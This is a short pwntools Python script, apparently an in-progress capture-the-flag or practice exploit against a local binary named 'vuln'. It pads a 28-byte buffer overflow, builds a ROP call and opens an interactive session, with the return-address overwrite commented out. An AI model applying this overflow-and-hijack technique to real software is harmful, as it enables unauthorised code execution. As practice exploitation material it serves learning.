#!/usr/bin/python3

from pwn import *
from pprint import pprint

vuln = ELF("./vuln")
p = vuln.process()

rop = ROP(vuln)
#rop.call("gets", "teste federal")
rop.call("vuln")

#pprint(vuln.symbols)

buf = 28
payload = [
	b"A"*buf,
#	p32(vuln.symbols['vuln'])
]
print(p32(vuln.symbols['vuln']))

payload = b"".join(payload)

print(p.recv())
print(p.sendline(payload))

p.interactive()

